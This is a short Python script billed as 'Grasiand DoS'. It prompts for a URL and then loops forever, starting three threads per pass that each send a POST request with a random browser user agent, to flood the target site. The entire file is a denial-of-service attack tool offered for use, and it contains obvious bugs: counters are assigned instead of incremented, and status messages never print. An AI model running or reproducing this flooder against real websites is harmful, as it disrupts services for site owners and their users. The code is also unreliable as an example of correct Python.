import requests
import threading
import os
import time
from colorama import Fore, Back, Style, init
from fake_useragent import UserAgent
init(autoreset=True)

ua = UserAgent(browsers=['edge', 'chrome'])

os.system("echo off && cls")
print(Fore.CYAN + "Welcome Grasiand DoS")
sonuc = 0
basarisiz = 0
url = input(Fore.MAGENTA + "Url : ")

def spam():
    y = ua.random
    header = {
        "User-Agent": y
    }
    req = requests.post(url, headers=header)
    if req.status_code == 200:
        sonuc = +1
        (Fore.GREEN + "Attack Send Succesfull" + str(sonuc))
    else:
        basarisiz = +1
        (Fore.RED + "Attack Don't Send " + str(basarisiz))

while True:
    if __name__ =="__main__":
        t1 = threading.Thread(target=spam, daemon=True)
        t2 = threading.Thread(target=spam, daemon=True)
        t3 = threading.Thread(target=spam, daemon=True)
        
        t1.start()
        t2.start()
        t3.start()
        
        sonuc +=1
        os.system('title "Grasiand | Attack Send : "' + str(sonuc))
        print("Attack Send : "+ str(sonuc))